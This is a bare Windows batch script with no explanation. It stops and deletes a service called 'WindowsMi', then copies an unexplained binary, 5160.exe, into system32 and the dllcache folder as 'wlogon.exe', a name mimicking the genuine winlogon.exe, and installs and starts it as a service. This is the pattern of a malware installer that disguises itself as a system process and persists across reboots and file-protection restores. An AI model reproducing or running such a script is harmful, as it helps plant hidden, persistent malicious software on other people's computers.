net stop WindowsMi
zdq stop WindowsMi
sc stop	WindowsMi
C:\Windows\System32\wlogon.exe -uninstall
echo
del %windir%\system32\wlogon.exe
echo
sc delete WindowsMi
echo
sc delete WindowsMi
copy 5160.exe c:\windows\system32\wlogon.exe /y
copy 5160.exe %windir%\system32\wlogon.exe /y
copy 5160.exe %windir%\system32\dllcache\wlogon.exe /y
C:\Windows\System32\wlogon.exe -install
%windir%\system32\wlogon.exe -install
echo
net start "WindowsMi"
echo
zdq start "WindowsMi"
echo
exit